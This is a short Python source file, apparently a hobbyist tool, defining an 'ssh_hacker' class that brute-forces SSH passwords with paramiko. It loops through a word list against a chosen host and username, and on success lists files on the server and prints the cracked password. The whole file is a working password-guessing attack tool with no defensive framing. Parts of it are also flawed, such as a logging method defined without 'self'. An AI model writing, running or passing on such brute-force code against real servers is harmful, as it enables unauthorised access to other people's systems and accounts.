from paramiko.ssh_exception import *
import paramiko, os, time


class ssh_hacker(object):
    def __init__(self, word_list, username, host, port):
        self.word_list = word_list
        self.username = username
        self.host = host
        self.port = port        



    def Update_logs(errors):
        with open('log.error', 'a') as log_file:
            log_file.write(str(errors) + '\n')

            
    def guess_Login(self):
        with open (self.word_list, 'r') as word_list:
            time_start = time.time()
            os.system('cls')
            i = 0 
            for password in word_list.readlines():
                password = password.replace('\n', '')
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    key = ssh.connect(self.host, self.port, self.username, password)
                    if key == None:
                        break
                except AuthenticationException:
                    i += 1
                    print('Try Guess: {0}'.format(i), end="\r")
                    continue
                except Exception as debug:
                    self.Update_logs(debug)
                    
            try:
                stdin, stdout, stderr = ssh.exec_command('ls')
                lines = stdout.readlines()
                os.system('cls')
                input('for show result enter pleasse')
                print('Total To Try: {0}'.format(i))
                print(f'Total Time Runnig\nSeconds of work: {time.time() - time_start}')
                print('Load files...')
                print(lines)
                print(f'info user : {self.host}\ninfo password : {password}')
                input('for close winsow enter')
            except SSHException:
                self.Update_logs('password is not in from word list Try agin..')
                print('password is not in from word list Try agin..')
